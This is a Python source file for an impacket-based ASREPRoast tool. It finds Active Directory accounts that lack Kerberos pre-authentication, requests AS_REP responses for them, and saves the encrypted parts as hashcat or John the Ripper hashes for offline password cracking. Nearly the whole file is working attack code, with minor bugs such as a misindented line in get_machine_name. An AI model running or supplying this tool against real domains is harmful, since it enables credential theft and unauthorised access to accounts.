#!/usr/bin/env python
#
#
# Author:
#   Zer1t0 (https://github.com/Zer1t0)
#
# Description:
#     This module will try to obtain AS_REP kerberos responses for usernames without Kerberos pre-authentication
#     required.
#     It offers 2 possibilities:
#       * To provide domain credentials in order to discover those no preauth users by querying with ldap
#       * To provide a list of usernames to check if it is possible to retrieve an AS_REP. (No credentials required)
#
#     As a result, the script provides a list with no preauth usernames and/or encoded AS_REP in JtR/hashcat format
#
# This is a python implementation of the ASREPRoast attack described in:
#     https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
#
#


import argparse
import sys
import logging
import random
import datetime
import re
from getpass import getpass

from binascii import hexlify
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from pyasn1.error import PyAsn1Error

from impacket import version
from impacket.examples import logger
from impacket.krb5.asn1 import AS_REQ, AS_REP, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5.kerberosv5 import sendReceive, KerberosError

from impacket.smbconnection import SMBConnection
from impacket.ldap import ldap, ldapasn1


class AsRepRoasterArgumentParser:

    def __init__(self):
        self._parser = argparse.ArgumentParser()
        self._define_args()

    def _define_args(self):
        self._parser.add_argument('-debug', action='store_true', help='turn DEBUG output ON')

        self._parser.add_argument('-domain', help='domain to perform AS_REP requesting')

        self._parser.add_argument('-dc-ip', action='store', metavar='<ip_address>',
                                  help='IP Address of the domain controller')

        self._parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat',
                                  help='format to save the AS_REQ of users without pre-authentication. '
                                       'Default is hashcat')

        self._parser.add_argument('-enumerate', action='store_true', default=False,
                                  help='Don\'t requet for AS_REP, just enumerate users')

        self._parser.add_argument('-outputfile', help='output filename to write ciphers in JtR/hashcat format')

        user_group = self._parser.add_mutually_exclusive_group()

        user_group.add_argument('-user', help='user to perform bruteforcing')
        user_group.add_argument('-users', help='file with user per line')

        auth_group = self._parser.add_argument_group('authentication')

        auth_group.add_argument('-creds', action='store', help='domain/username[:password]')

        auth_group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH",
                                help='NTLM hashes, format is LMHASH:NTHASH')

        auth_group.add_argument('-k', action="store_true",
                                help='use Kerberos authentication. Grabs credentials from ccache file '
                                     '(KRB5CCNAME) based on target parameters. If valid credentials '
                                     'cannot be found, it will use the ones specified in the command '
                                     'line')
        auth_group.add_argument('-aesKey', action="store", metavar="hex key",
                                help='AES key to use for Kerberos Authentication '
                                     '(128 or 256 bits)')

        auth_group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')

    def parse_args(self):
        if len(sys.argv) == 1:
            self._parser.print_help()
            print "\nExamples: "
            print "\t./asreproaster.py -users users_file.txt -domain contoso.com\n"
            sys.exit(1)

        args = self._parser.parse_args()
        args.request = not args.enumerate

        if args.users:
            args.users = self._get_file_lines(args.users)
        elif args.user:
            args.users = [args.user]
        else:
            args.users = []

        args.query_ldap_users = not args.users

        self._parse_creds(args)

        if not args.domain:
            args.domain = args.cred_domain

        if not args.domain:
            self._parser.print_usage()
            print "Domain required"
            sys.exit(1)

        if args.query_ldap_users and not args.cred_user:
            self._parser.print_usage()
            print "-creds required"
            sys.exit(1)

        return args

    def _parse_creds(self, args):
        args.cred_user = ''
        args.cred_password = ''
        args.cred_domain = ''
        args.cred_lmhash = ''
        args.cred_nthash = ''
        args.cred_kerberos = args.k
        args.cred_aes_key = args.aesKey

        if args.hashes:
            args.cred_lmhash, args.cred_nthash = args.hashes.split(':')

        if args.creds:
            args.cred_domain, args.cred_user, args.cred_password = self._parse_creds_parameter(args)

            if not args.no_pass:
                if not args.cred_password and not args.cred_lmhash and not args.cred_nthash and not args.cred_aes_key:
                    args.cred_password = getpass("Password:")

    def _parse_creds_parameter(self, args):
        target_param = args.creds + '@'
        domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
            target_param).groups('')

        # In case the password contains '@'
        if '@' in address:
            password = password + '@' + address.rpartition('@')[0]
            address = address.rpartition('@')[2]

        return domain, username, password

    def _get_file_lines(self, filepath):
        with open(filepath) as fi:
            return [line.strip('\r\n') for line in fi]


def main():
    logger.init()
    print version.BANNER

    parser = AsRepRoasterArgumentParser()
    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    RoasterMain(args).main()


class RoasterMain:

    def __init__(self, args):
        self.args = args
        self.out_file = open(args.outputfile, "w+") if args.outputfile else None

        creds = UserCreds(args.cred_user, args.cred_domain)
        creds.password = args.cred_password
        creds.nthash = args.cred_nthash
        creds.lmhash = args.cred_lmhash
        creds.aes_key = args.cred_aes_key
        creds.use_kerberos = args.k

        self.as_rep_roaster = AsRepRoaster(self.args.domain, creds, self.args.dc_ip)
        self.as_rep_count = 0

    def main(self):
        try:
            users = self.get_users()
            if self.args.request:
                if users:
                    self.get_asreps(users)
                else:
                    logging.info("Skipping AS_REP fetching due no users available")
        finally:
            self.close()

    def close(self):
        if self.out_file:
            self.out_file.close()

            if self.as_rep_count:
                logging.info("Saved retrieved AS_REP in %s" % self.args.outputfile)

    def get_users(self):
        if self.args.query_ldap_users:
            logging.info("Looking for no preauth users")
            users = self.as_rep_roaster.query_for_no_preauth_users()

            if users:
                print "Found users without kerberos preauth in %s:" % self.args.domain
                print '\n'.join(users)
            else:
                print "No users found in %s without preauth required" % self.args.domain

        else:
            users = self.args.users

        return users

    def get_asreps(self, users):
        logging.info("Trying to return AS_REPs")
        for user, as_rep in self.as_rep_roaster.retrieve_asreps(users):
            self._save_as_rep(user, as_rep)

        if self.as_rep_count == 0:
            logging.info("No AS_REP was obtained :'(")

    def _save_as_rep(self, user, as_rep):

        etype = as_rep['enc-part']['etype']
        cipher_part_1 = hexlify(as_rep['enc-part']['cipher'].asOctets()[:16])
        cipher_part_2 = hexlify(as_rep['enc-part']['cipher'].asOctets()[16:])

        if self.args.format.lower() == 'john':
            encoded_cipher_as_rep = '$krb5asrep$%s@%s:%s$%s' % (user, self.args.domain, cipher_part_1, cipher_part_2)
        else:
            encoded_cipher_as_rep = '$krb5asrep$%d$%s@%s:%s$%s' % (etype, user, self.args.domain,
                                                                   cipher_part_1, cipher_part_2)

        if self.out_file:
            self.out_file.write(encoded_cipher_as_rep + '\n')
        logging.info(encoded_cipher_as_rep)

        self.as_rep_count += 1


class UserCreds:

    def __init__(self, username, domain):
        self.username = username
        self.domain = domain
        self.password = ''
        self.lmhash = ''
        self.nthash = ''
        self.aes_key = ''
        self.use_kerberos = False


class AsRepRoaster:

    def __init__(self, domain, creds=None, dc_host=None):
        self.domain = domain
        self.dc_host = dc_host
        self.creds = creds

    def query_for_no_preauth_users(self):

        ldap_connection = self._create_ldap_connection()

        search_filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
        resp = ldap_connection.search(searchFilter=search_filter, attributes=['sAMAccountName'])
        ldap_connection.close()

        return self._process_ldap_response(resp)

    def _create_ldap_connection(self):

        if self.creds.use_kerberos:
            target = self.get_machine_name()
        else:
            if self.creds.domain != self.domain:
                target = self.creds.domain
            elif self.dc_host:
                target = self.dc_host
            else:
                target = self.domain

        if not self.creds.use_kerberos and not (self.creds.password or self.creds.lmhash or self.creds.nthash):
            raise ValueError("At least one of password, nthash or lmhash is required to perform ldap authentication")

        ldap_connection = ldap.LDAPConnection('ldap://%s' % target, self.baseDN(), self.dc_host)

        if self.creds.use_kerberos:
            ldap_connection.kerberosLogin(self.creds.username, self.creds.password, self.creds.domain,
                                          self.creds.lmhash, self.creds.nthash, self.creds.aes_key,
                                          kdcHost=self.dc_host)
        else:
            ldap_connection.login(self.creds.username, self.creds.password, self.creds.domain,
                                  self.creds.lmhash, self.creds.nthash)

        return ldap_connection

    def get_machine_name(self):  # based on getMachineName from GetUsersSPNs.py
        if self.creds.domain != self.domain:
            target = self.creds.domain
        elif self.dc_host:
            target = self.dc_host
        else:
            target = self.domain

            s = SMBConnection(target, target)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise('Error while anonymous logging into %s' % self.domain)
        else:
            try:
                s.logoff()
            except Exception:
                # We don't care about exceptions here as we already have the required
                # information. This also works around the current SMB3 bug
                pass
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    def _process_ldap_response(self, response):
        usernames = []
        for result_entry in response:
            if not isinstance(result_entry, ldapasn1.SearchResultEntry):
                continue

            attributes = result_entry['attributes']
            username = [str(attr['vals'][0]) for attr in attributes if attr['type'] == 'sAMAccountName'][0]
            usernames.append(username)

        return usernames

    def baseDN(self):
        domain_tags = self.domain.split('.')
        baseDN = ''

        for tag in domain_tags:
            baseDN += 'dc=%s,' % tag

        return baseDN[:-1]  # to remove the last ','

    def retrieve_asreps(self, users):
        messenger = KerberosMessenger(self.domain, self.dc_host)

        for user in users:
            try:
                logging.debug("Trying AS_REP for %s" % user)
                as_rep = messenger.request_as_rep_without_preauth(user)
                yield user, as_rep
            except KerberosMessengerException as ex:
                logging.debug('Error: %s' % ex)


class AsReqMessage:

    def __init__(self, domain, username):
        self.domain = domain.lower()
        self.include_pac = True
        self.client_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    def build(self):
        if not self.domain:
            raise ValueError('Empty domain not allowed in Kerberos')

        as_req = AS_REQ()

        servername = Principal('krbtgt/%s' % self.domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = self.include_pac
        encodedPacRequest = encoder.encode(pacRequest)

        as_req['pvno'] = 5
        as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        as_req['padata'] = noValue
        as_req['padata'][0] = noValue
        as_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        as_req['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(as_req, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', servername.components_to_asn1)
        seq_set(reqBody, 'cname', self.client_name.components_to_asn1)

        reqBody['realm'] = self.domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        return encoder.encode(as_req)


class KerberosMessengerException(Exception):

    def __init__(self, message, sub_exception):
        Exception.__init__(self, message)
        self.sub_exception = sub_exception


class KerberosMessenger:

    def __init__(self, domain, kdc_host=None):
        self.domain = domain
        self.kdc_host = kdc_host

    def request_as_rep_without_preauth(self, username):
        try:
            return self._request_as_rep_without_preauth(username)
        except PyAsn1Error as ex:
            raise KerberosMessengerException("Error parsing response. Probably KRB_ERROR instead of AS_REP", ex)
        except KerberosError as ex:
            raise KerberosMessengerException("Error in Kerberos", ex)
        except Exception as ex:
            raise KerberosMessengerException("Unknown error", ex)

    def _request_as_rep_without_preauth(self, username):
        as_req = AsReqMessage(self.domain, username)
        as_req_raw = as_req.build()

        raw_response = sendReceive(as_req_raw, self.domain, self.kdc_host)
        as_rep = decoder.decode(raw_response, asn1Spec=AS_REP())[0]

        return as_rep


if __name__ == '__main__':
    main()
